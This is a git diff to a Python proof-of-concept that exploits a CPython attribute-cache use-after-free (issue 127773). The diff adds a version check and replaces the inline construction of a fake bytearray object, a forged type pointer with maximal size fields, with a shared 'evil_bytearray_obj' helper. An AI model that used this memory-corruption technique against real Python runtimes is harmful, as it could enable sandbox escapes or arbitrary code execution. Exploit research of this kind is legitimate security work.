@@ -11,6 +11,10 @@ Bug Credits: <https://github.com/python/cpython/issues/127773>
 # In their discussion, I noticed that this bug is just an attribute cache UAF, so I
 # just reworked the POC to make it work with creating fake objects.
 
+from common import evil_bytearray_obj, check_pyversion
+
+check_pyversion(patched_ver=(3, 14, 0))
+
 class Base:
     value = 1
 
@@ -24,15 +28,8 @@ class WeirdClass(metaclass=Meta):
 class bytes_subclass(bytes):
     pass
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 
